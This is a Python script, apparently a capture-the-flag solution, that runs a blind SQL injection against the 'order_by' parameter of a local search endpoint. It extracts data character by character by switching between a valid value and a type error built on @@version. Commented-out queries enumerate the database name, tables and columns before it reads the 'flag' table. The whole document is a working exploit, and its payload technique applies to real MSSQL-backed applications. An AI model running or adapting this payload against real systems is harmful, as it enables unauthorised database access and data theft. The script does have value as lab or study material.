import requests
import string

session = requests.Session()
session.verify = False

url = "http://localhost:3000/search"

if __name__ == "__main__":
    # Brute-force the password character by character
    result = ""
    #query = "select DB_NAME()" #-> hackathon
    #query = "SELECT name FROM hackathon..sysobjects WHERE xtype=0x55 ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY"
    #query = "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = CAST(0x666c6167 AS VARCHAR(4)) )" # flag
    query = "SELECT flag from flag" # flag
    index = 1
    charset = string.ascii_letters + string.digits + string.punctuation
    while True:
        found_char = False
        for char in charset:
            print(f"Trying character: {char} at position {index}")
            payload = f"(select 1 where 1=(select iif(ascii(substring(({query}),{index},1))={ord(char)}, 3, @@version)))"
            data = {
                "search": "test",
                "created_by": "",
                "order_by": payload
            }
            response = session.post(url, data=data)
            if response.status_code == 200:
                result += char
                print(f"Found character: {char}, Current result: {result}")
                found_char = True
                index += 1
                break
        if not found_char:
            print("Final result:", result)
            print("Data extraction complete.")
            break   
